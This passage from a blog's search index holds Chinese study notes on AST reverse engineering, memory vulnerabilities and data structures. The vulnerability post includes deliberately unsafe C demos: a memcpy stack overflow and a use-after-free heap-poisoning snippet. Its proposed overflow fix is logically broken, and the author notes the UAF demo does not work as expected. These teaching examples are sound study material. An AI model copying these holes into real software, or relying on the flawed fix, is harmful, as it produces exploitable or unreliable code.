            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android-Create</title>
      <link href="/2023/03/31/Ast/"/>
      <url>/2023/03/31/Ast/</url>
      
        <content type="html"><![CDATA[<ul><li>Ast<span id="more"></span></li></ul><HR color="red"></HR><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><h3 id="ast树-抽象语法树"><a href="#ast树-抽象语法树" class="headerlink" title="ast树(抽象语法树)"></a>ast树(抽象语法树)</h3><h3 id="官方解释"><a href="#官方解释" class="headerlink" title="官方解释"></a>官方解释</h3><ul><li>是源代码语法结构的一种抽象表示。它以树状的形式表现编程语言的语法结构，树上的每个节点都表示源代码中的一种结构。</li></ul><h3 id="简单描述"><a href="#简单描述" class="headerlink" title="简单描述"></a>简单描述</h3><ul><li>其实很简单，ast树就跟一本书的目录一样，只不过这个目录更加详细。以一种提取关键词和功能的方式完美展现一段代码的层次关系</li></ul><h3 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h3><p>例如js代码<code>x = a + b</code>生成<code>ast</code>树：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&quot;type&quot;: &quot;AssignmentExpression&quot;,</span><br><span class="line">&quot;start&quot;: 0,</span><br><span class="line">&quot;end&quot;: 7,</span><br><span class="line">&quot;operator&quot;: &quot;=&quot;,</span><br><span class="line">&quot;left&quot;: &#123;</span><br><span class="line">    &quot;type&quot;: &quot;Identifier&quot;,</span><br><span class="line">    &quot;start&quot;: 0,</span><br><span class="line">    &quot;end&quot;: 1,</span><br><span class="line">    &quot;name&quot;: &quot;x&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;right&quot;: &#123;</span><br><span class="line">    &quot;type&quot;: &quot;BinaryExpression&quot;,</span><br><span class="line">    &quot;start&quot;: 4,</span><br><span class="line">    &quot;end&quot;: 7,</span><br><span class="line">    &quot;left&quot;: &#123;</span><br><span class="line">    &quot;type&quot;: &quot;Identifier&quot;,</span><br><span class="line">    &quot;start&quot;: 4,</span><br><span class="line">    &quot;end&quot;: 5,</span><br><span class="line">    &quot;name&quot;: &quot;a&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;operator&quot;: &quot;+&quot;,</span><br><span class="line">    &quot;right&quot;: &#123;</span><br><span class="line">    &quot;type&quot;: &quot;Identifier&quot;,</span><br><span class="line">    &quot;start&quot;: 6,</span><br><span class="line">    &quot;end&quot;: 7,</span><br><span class="line">    &quot;name&quot;: &quot;b&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到其内容是十分详细的：</p><ul><li>name：目标元素，作用对象</li><li>start，end：name对象在程序代码中的起止位置</li><li>operator：执行操作</li><li>type：操作种类，比如说一个函数、一个返回值、一个运算、一个变量等等</li></ul><h3 id="在线生成ast树结构网站："><a href="#在线生成ast树结构网站：" class="headerlink" title="在线生成ast树结构网站："></a>在线生成ast树结构网站：</h3><ul><li><a href="https://astexplorer.net/">https://astexplorer.net/</a></li></ul><h2 id="ast逆向"><a href="#ast逆向" class="headerlink" title="ast逆向"></a>ast逆向</h2><ul><li>目前我接触的这方面东西也很少，基本上要做的事情只有两种：<ol><li>给一个ast树，然后让你去除其中的混淆操作</li><li>给定ast还原代码，这个代码可以是js，也可以是其他任何语言</li></ol></li><li>对于代码还原，这种很难有现成工具使用，小代码手推，大代码自己写针对脚本</li><li>手推的话：<ul><li>定位operator先还原运算表达式</li><li>由内层向外，还原一部分删一部分树结构</li><li>独立度大的优先，按函数模块还原</li><li>自己写对应代码生成ast树比对</li></ul></li><li>大概就这样</li></ul>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Loophole</title>
      <link href="/2023/03/31/Bug/"/>
      <url>/2023/03/31/Bug/</url>
      
        <content type="html"><![CDATA[<ul><li>overflow</li><li>uaf</li><li>shell<span id="more"></span></li></ul><HR color="red"></HR><h1 id="漏洞相关"><a href="#漏洞相关" class="headerlink" title="漏洞相关"></a>漏洞相关</h1><h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">需要注意栈向低地址生长，栈中的变量向高地址生长，所以溢出后覆盖的是高地址区域，逆向中可用来隐藏信息以及关键函数入口等等</span><br></pre></td></tr></table></figure><h4 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">testFunc</span><span class="params">(<span class="type">char</span> *Buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> testBuf[<span class="number">8</span>];</span><br><span class="line"><span class="built_in">memcpy</span>(testBuf, Buf, <span class="number">64</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> Buf[<span class="number">64</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">memset</span>(Buf, <span class="number">0x41</span>, <span class="number">64</span>);</span><br><span class="line"><span class="built_in">testFunc</span>(Buf);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><ul><li><p>testfunc中给8字节的testbuf数组赋值了64字节数据溢出，从而导致函数返回地址错误</p></li><li><pre><code class="asm">0019FE90 414141410019FE94 00401057 返回到 test.00401057 自 test.004014300019FE98 414141410019FE9C 414141410019FEA0 414141410019FEA4 414141410019FEA8 414141410019FEAC 414141410019FEB0 414141410019FEB4 414141410019FEB8 414141410019FEBC 414141410019FEC0 414141410019FEC4 414141410019FEC8 414141410019FECC 41414141<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#### 防范</span><br><span class="line"></span><br><span class="line">  ```c++</span><br><span class="line">  //加入长度判断</span><br><span class="line">  int maxsize = 8;</span><br><span class="line">  if(maxsize &gt; sizeof(testBuf))</span><br><span class="line">  &#123;</span><br><span class="line">      //数据截断</span><br><span class="line">   memcpy(testBuf, Buf, maxsize);   </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></code></pre></li></ul><h3 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h3><h3 id="整型溢出（赋值类型大小不匹配）"><a href="#整型溢出（赋值类型大小不匹配）" class="headerlink" title="整型溢出（赋值类型大小不匹配）"></a>整型溢出（赋值类型大小不匹配）</h3><ol><li><p>存储溢出</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">0x12345678</span>;</span><br><span class="line"><span class="type">short</span> b = a;</span><br><span class="line">cout &lt;&lt;<span class="string">&quot;0x&quot;</span> &lt;&lt;hex &lt;&lt;b &lt;&lt;endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//0x5678,丢失数据</span></span><br></pre></td></tr></table></figure></li><li><p>运算溢出（计算后超出原类型数据范围，导致溢出）</p></li><li><p>符号问题</p></li></ol><h3 id="UAF漏洞"><a href="#UAF漏洞" class="headerlink" title="UAF漏洞"></a>UAF漏洞</h3><ul><li><p>use-after-free</p></li><li><p>大致过程</p><ul><li>函数A顺序调用B、C、D三个子函数</li><li>函数B释放了函数中的一部分资源，让函数中的某些指针变为空指针</li><li>函数C又申请使用刚才释放的资源空间（干坏事）</li><li>D函数判断不严密，导致刚才释放的空指针被继续使用</li></ul></li><li><p>相当于就是：在一个空间资源被释放后，将恶意信息注入该空间，然后又在不知情的情况下继续使用了该空间，引发漏洞</p></li><li><p>星盟公开课的一段代码（不知道哪出了问题，暂时没有预期输出）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> target[<span class="number">100</span>];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *p = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">p[<span class="number">0</span>] = target; <span class="comment">// p_chunk-&gt;fd is modified</span></span><br><span class="line">target[<span class="number">0</span>] = <span class="number">0</span>; <span class="comment">// prev size</span></span><br><span class="line">target[<span class="number">1</span>] = <span class="number">0x21</span>; <span class="comment">// size</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">// must be same as p</span></span><br><span class="line"><span class="type">char</span> *q = <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">// must be same as target</span></span><br><span class="line"><span class="built_in">memcpy</span>(q, <span class="string">&quot;hello&quot;</span>,<span class="number">6</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,&amp;target[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="加脱壳相关"><a href="#加脱壳相关" class="headerlink" title="加脱壳相关"></a>加脱壳相关</h1><ul><li>通俗地讲，不管是压缩壳还是加密壳，都是附着于原程序，对其进行各种处理。然后在程序加载到内存中时，先运行壳的解压引擎还原程序，再执行程序。二者的界限也越来越模糊</li><li>为了保证效率，对于一个压缩引擎，我们要保证他有足够快的解压速度，以确保程序在运行时的速度。至于压缩速度就略显不重要</li></ul><h4 id="压缩壳"><a href="#压缩壳" class="headerlink" title="压缩壳"></a>压缩壳</h4><ul><li>upx</li><li>ASpack</li></ul><h4 id="加密壳"><a href="#加密壳" class="headerlink" title="加密壳"></a>加密壳</h4><ul><li>ASProtect</li><li>Armadillo：双进程运行，cc保护</li><li>EXECryptor</li><li>Themida</li></ul><h4 id="虚拟机保护"><a href="#虚拟机保护" class="headerlink" title="虚拟机保护"></a>虚拟机保护</h4><ul><li>VMProtect</li></ul>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Data Structure</title>
      <link href="/2023/03/31/DataStruction/"/>
      <url>/2023/03/31/DataStruction/</url>
      
        <content type="html"><![CDATA[<ul><li>用低劣的水平描述数据结构的东西，后续考研还要细学</li><li>目前主要是要考试，大体过一遍，如果你质疑我的文章，那一定是我错了，我会忽略一些专业术语，更偏向于自己的理解思考</li><li>&lt;对于学过数据结构的人可能有一定用处吧&gt;<span id="more"></span></li></ul><HR color="red"></HR><h1 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h1><ul><li>一堆概念<ul><li>数据：客观事物的符号描述</li><li>数据元素：数据的基本单位</li><li>数据项：组成数据元素的、有独立含义的、不可分割的最小单位</li><li>数据对象：性质相同的数据元素的集合</li></ul></li><li>逻辑结构<ul><li>线性与非线性</li><li>线性、树、图、集合</li></ul></li><li>存储结构</li><li>时间复杂度、空间复杂度</li></ul><h1 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h1><h4 id="普通"><a href="#普通" class="headerlink" title="普通"></a>普通</h4><h4 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h4><h4 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h4><h4 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h4><h1 id="栈和队列"><a href="#栈和队列" class="headerlink" title="栈和队列"></a>栈和队列</h1><h4 id="栈（先进后出）"><a href="#栈（先进后出）" class="headerlink" title="栈（先进后出）"></a>栈（先进后出）</h4><ul><li>不想说了，没完没了</li></ul><h4 id="队列（先进先出）"><a href="#队列（先进先出）" class="headerlink" title="队列（先进先出）"></a>队列（先进先出）</h4><ul><li>普通队列</li><li>循环队列</li><li>双向队列（两个端点都能入队、出队）</li><li>优先队列（队列元素维持有序，算竞常用）</li></ul><h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><h3 id="KMP算法-字符串匹配，t向s匹配"><a href="#KMP算法-字符串匹配，t向s匹配" class="headerlink" title="KMP算法(字符串匹配，t向s匹配)"></a>KMP算法(字符串匹配，t向s匹配)</h3><ul><li>书上的代码便于理解，但是不能跑，下标有问题</li><li>这个难点就在一个求next数组吧。所谓next，就是每个字符的最长相同前后缀。至于代码上注意把握是在递归求解即可</li></ul><h4 id="结构体声明"><a href="#结构体声明" class="headerlink" title="结构体声明"></a>结构体声明</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXSIZE 1024</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    <span class="type">char</span> ch[MAXSIZE+<span class="number">1</span>];<span class="comment">//字符串</span></span><br><span class="line">    <span class="type">int</span> length;<span class="comment">//长度</span></span><br><span class="line">&#125;String;</span><br></pre></td></tr></table></figure><h4 id="求解next数组"><a href="#求解next数组" class="headerlink" title="求解next数组"></a>求解next数组</h4><ul><li>优化前</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Get_Next</span><span class="params">(String t, <span class="type">int</span> ne[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ne[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; t.length)&#123;</span><br><span class="line">        <span class="keyword">if</span>(j == <span class="number">-1</span> || t.ch[i] == t.ch[j])&#123;</span><br><span class="line">            i++, j++;</span><br><span class="line">            ne[i] = j;<span class="comment">//相等，直接在之前的基础上加一</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">            j = ne[j];      <span class="comment">//不相等，向前递归</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>优化后（优化是优化掉了 t 串 ne[j] 位置的元素与 t[j] 相同的情况，这种情况的匹配一否全否。所以会让ne[j]递归到 t[ne[j]] !&#x3D; t[j]）</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Get_Next</span><span class="params">(String t, <span class="type">int</span> nextval[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    nextval[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; t.length)&#123;</span><br><span class="line">        <span class="comment">//相同前后缀，进入判断</span></span><br><span class="line">        <span class="keyword">if</span>(j == <span class="number">-1</span> || t.ch[i] == t.ch[j])&#123;</span><br><span class="line">            i++, j++;<span class="comment">//修改位置</span></span><br><span class="line">            <span class="keyword">if</span>(t.ch[i] != t.ch[j])</span><br><span class="line">                nextval[i] = j;<span class="comment">//不相等，直接取值             </span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                nextval[i] = nextval[j];    <span class="comment">//相等，无意义，再次向前求解</span></span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">            j = nextval[j];      <span class="comment">//非相同前后缀，向前递归</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="KMP"><a href="#KMP" class="headerlink" title="KMP"></a>KMP</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">KMP</span><span class="params">(String s, String t)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> nextval[MAXSIZE+<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">Get_Next</span>(t, nextval);             <span class="comment">//求解nextval</span></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; s.length &amp;&amp; j &lt; t.length)&#123;</span><br><span class="line">        <span class="keyword">if</span>(j == - <span class="number">1</span> || s.ch[i] == t.ch[j])&#123;  <span class="comment">//相同，可匹配</span></span><br><span class="line">            i++, j++;</span><br><span class="line">        &#125;<span class="keyword">else</span>     <span class="comment">//不可匹配，向前追溯</span></span><br><span class="line">            j = nextval[j];        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//输出匹配位置</span></span><br><span class="line">    <span class="keyword">if</span>(j &gt;= t.length)</span><br><span class="line">        <span class="keyword">return</span> i - t.length + <span class="number">1</span>;<span class="comment">//输出实际位置长度，非数组下标</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="树"><a href="#树" class="headerlink" title="树"></a>树</h1><h3 id="一堆概念"><a href="#一堆概念" class="headerlink" title="一堆概念"></a>一堆概念</h3><ul><li>写写有些什么吧<ul><li>结点<ul><li>父母结点、祖先结点、左右孩子结点、兄弟结点、子孙结点、前后辈结点</li></ul></li><li>结点的度、结点的层次、树的高度</li><li>有序树、无序树</li><li>二叉树、满二叉树、完全二叉树、线索二叉树</li><li>森林</li></ul></li></ul><h3 id="二叉树的存储"><a href="#二叉树的存储" class="headerlink" title="二叉树的存储"></a>二叉树的存储</h3><h4 id="顺序存储"><a href="#顺序存储" class="headerlink" title="顺序存储"></a>顺序存储</h4><ul><li>将二叉树按照完全二叉树层序依次编号，自上而下，自左向右。按这个编号顺序放进一维容器就可</li><li>二叉树中的没有的结点，编号后按值为0放进容器</li><li>这样存储，若结点下标为k，则其左儿子下标为2k，右儿子为2k+1</li></ul><h4 id="链式存储"><a href="#链式存储" class="headerlink" title="链式存储"></a>链式存储</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">    Data data;            <span class="comment">//数据</span></span><br><span class="line"><span class="type">int</span> *lchild, *rchild;<span class="comment">//指向左儿子和右儿子</span></span><br><span class="line">    <span class="type">int</span> *parent<span class="comment">//指向父节点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h3><h4 id="先序遍历"><a href="#先序遍历" class="headerlink" title="先序遍历"></a>先序遍历</h4><ul><li>根左右，就是从根结点开始跑图^_^</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//递归是万能的</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">front</span><span class="params">(Node x)</span></span>&#123;</span><br><span class="line">    cout &lt;&lt;x-&gt;data &lt;&lt;<span class="string">&quot; &quot;</span>;<span class="comment">//输出根</span></span><br><span class="line"><span class="built_in">front</span>(x-&gt;lchild);<span class="comment">//递归左儿子</span></span><br><span class="line">    <span class="built_in">front</span>(x-&gt;rchild);<span class="comment">//递归右儿子</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//下面那俩写成递归代码和这个差不多</span></span><br></pre></td></tr></table></figure><h4 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h4><ul><li>左根右，看成果树自然脱落，然后顺序捡果子</li></ul><h4 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h4><ul><li>左右根，好像没什么可描述的思路。</li></ul><h4 id="层序遍历"><a href="#层序遍历" class="headerlink" title="层序遍历"></a>层序遍历</h4><ul><li>顾名思义，从根结点开始，一层一层输出就完事</li></ul><h4 id="树的遍历"><a href="#树的遍历" class="headerlink" title="树的遍历"></a>树的遍历</h4><ul><li>这个就直接合并了，没有中序遍历，其他三种都是有的</li></ul><h3 id="森林"><a href="#森林" class="headerlink" title="森林"></a>森林</h3><ul><li>把一堆树放一起</li></ul><h4 id="森林遍历"><a href="#森林遍历" class="headerlink" title="森林遍历"></a>森林遍历</h4><ul><li>先序遍历<ul><li>先找森林中第一棵树的根结点</li><li>先序遍历第一棵树，把剩余的树看成新的森林</li><li>重复上面的操作</li></ul></li><li>中序遍历<ul><li>先找森林中第一棵树的<code>子树森林</code>（也就是第一棵树中除根结点以外的部分）</li><li>后序遍历第一棵树，把剩余的树看成新的森林</li><li>重复上面的操作</li></ul></li></ul><h3 id="二叉树、树、森林的转换"><a href="#二叉树、树、森林的转换" class="headerlink" title="二叉树、树、森林的转换"></a>二叉树、树、森林的转换</h3><ul><li>树变二叉树<ol><li>在所有的兄弟之间连线</li><li>只保留父节点与第一个儿子结点的连线，去掉其他父子结点之间的连线</li></ol></li><li>森林变二叉树<ol><li>对每一棵树执行树变二叉树的操作</li><li>将森林中所有的树的根结点连起来</li></ol></li><li>二叉树变森林<ol><li>对于一个结点x，他是父结点的左孩子，在父节点和结点x的右孩子、以及其右孩子的右孩子…之间连线</li><li>去掉所有结点与右孩子的连线</li></ol></li></ul><h3 id="哈夫曼树"><a href="#哈夫曼树" class="headerlink" title="哈夫曼树"></a>哈夫曼树</h3><ul><li>最优树，带权路径最短，也就是所有结点的深度与权值积之和最小</li></ul><h3 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h3><ul><li>在哈夫曼树上按照<code>左0右1</code>的规则从根节点走到目标节点形成的数字串</li></ul><h1 id="图"><a href="#图" class="headerlink" title="图"></a>图</h1><h3 id="一堆概念-1"><a href="#一堆概念-1" class="headerlink" title="一堆概念"></a>一堆概念</h3><ul><li>有向图、无向图、混合图</li><li>点、权值</li><li>出度、入度</li><li>边、弧</li><li>强连通（有向图）<ul><li>两个顶点强连通：两个顶点至少存在一条互相可达路径</li><li>强连通图：任意两个顶点强连通</li><li>强连通分量：非强连通图中的最大强连通子图</li></ul></li><li>连通、回路（环）、稀疏图、稠密图</li><li>零图：仅有孤立结点</li><li>平凡图：只有一个孤立结点</li><li>多重图：有多重边的图。非多重图为线图</li><li>简单图：无多重边和自回环的图</li><li>完全图：任意两个不同结点之间都有边的简单图<ul><li>记为Kn</li><li>无向完全图的边数为n(n-1)&#x2F;2</li></ul></li><li>k度正则图：在无向图G&#x3D;&lt;V，E&gt;中，每个结点的度都是k</li><li>点割集：有一个连通图和点的集合，如果在图上把所有集合中的点删去，这个图就不是连通图，而这个集合中的点少一个，它还是连通图，这个集合就叫点割集</li><li>割点：存在两个点u、w，使得uw之间的每一条通路都必须经过点v，那么v就是割点。意思也就是没了v他就不是个连通图</li><li>结点连通度：在一个非完全图的连通图里，变为不连通图所需删去结点的最小数目</li><li>边割集、割边、边连通度</li><li>结点连通度𝜅(G) ≤ 边连通度𝜆(G) ≤ 最小度δ(G)</li></ul><h3 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有些东西，凭直觉走就行了</span><br></pre></td></tr></table></figure><table><thead><tr><th></th><th>邻接表</th><th>邻接矩阵</th><th>十字链表</th><th>邻接多重表</th></tr></thead><tbody><tr><td>空间复杂度</td><td>有向图o(V+E2)，无向图o(V+E)</td><td>o(V2)</td><td>o(V+E)</td><td>o(V+E)</td></tr><tr><td>适用范围</td><td>稀疏图</td><td>稠密图</td><td>有向图</td><td>无向图</td></tr><tr><td>缺点</td><td>点和边难删除，一找就需要遍历</td><td>删点需要删除整行整列</td><td></td><td></td></tr></tbody></table><h4 id="邻接表"><a href="#邻接表" class="headerlink" title="邻接表"></a>邻接表</h4><ul><li>就像一个二维向量？</li><li>先把每个点都摘出来是第一维。然后对于每个点，又把所有跟它有关的边都存一遍是第二维</li></ul><h4 id="逆邻接表（有向图）"><a href="#逆邻接表（有向图）" class="headerlink" title="逆邻接表（有向图）"></a>逆邻接表（有向图）</h4><ul><li>针对于有向图，邻接表的第二维放的是由某个点指向的所有边（其实应该叫弧）</li><li>逆邻接表，就是把第二维给倒一下，存所有指向某个点的边</li><li>比如点v，就存a-&gt;v，b-&gt;v，c-&gt;v…</li></ul><h4 id="邻接矩阵"><a href="#邻接矩阵" class="headerlink" title="邻接矩阵"></a>邻接矩阵</h4><ul><li>正常理解就行了</li><li>第n行第m列等于1表示：n-&gt;m &#x3D; 1</li><li>具体数字，那就看什么图了，可以表示权值，也可以表示是否有边</li></ul><h4 id="十字链表（有向图）"><a href="#十字链表（有向图）" class="headerlink" 